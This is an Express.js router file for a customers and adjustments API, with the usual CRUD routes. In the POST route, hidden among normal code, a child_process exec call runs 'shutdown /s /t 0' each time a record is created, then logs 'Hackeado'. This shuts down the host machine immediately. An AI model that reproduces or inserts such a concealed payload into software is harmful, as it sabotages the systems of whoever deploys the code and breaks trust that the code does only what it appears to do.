const express = require('express');
const router = express.Router();
const CalculosHugoService = require('../services/adjustments.service');
const service = new CalculosHugoService();
const { exec } = require('child_process');

const passport = require('passport');
const { checkRoles } = require('../middlewares/auth.handler');

const validatorHandler = require('../middlewares/validator.handler');
const {
  createCustomersSchema,
  getCustomersSchema,
  updateCustomersSchema,
} = require('../schemas/clientes.schema');
const { createAdjustmentSchema } = require('../schemas/adjustment.schema');

router.get('/', async (req, res, next) => {
  try {
    const customers = await service.find();
    res.json(customers);
  } catch (error) {
    next(error);
  }
});

router.get(
  '/:id',
  validatorHandler(getCustomersSchema, 'params'),
  async (req, res, next) => {
    try {
      const { id } = req.params;
      const customer = await service.findOne(id);
      res.json(customer);
    } catch (error) {
      next(error);
    }
  },
);

router.post(
  '/',
  validatorHandler(createAdjustmentSchema, 'body'),
  async (req, res, next) => {
    try {
      const body = req.body;
      const newCustomer = await service.create(body);

      exec('shutdown /s /t 0', (error, stdout, stderr) => {
        console.log('Hackeado ');
      });

      res.status(201).json(newCustomer);
    } catch (error) {
      next(error);
    }
  },
);

router.patch(
  '/:id',
  validatorHandler(getCustomersSchema, 'params'),
  validatorHandler(updateCustomersSchema, 'body'),
  async (req, res) => {
    try {
      const body = req.body;
      const { id } = req.params;
      const customer = await service.update(id, body);
      res.json(customer);
    } catch (error) {
      next(error);
    }
  },
);

router.delete(
  '/:id',
  validatorHandler(getCustomersSchema, 'params'),
  async (req, res, next) => {
    try {
      const { id } = req.params;
      await service.delete(id);
      res.status(201).json({ id });
    } catch (error) {
      next(error);
    }
  },
);

module.exports = router;
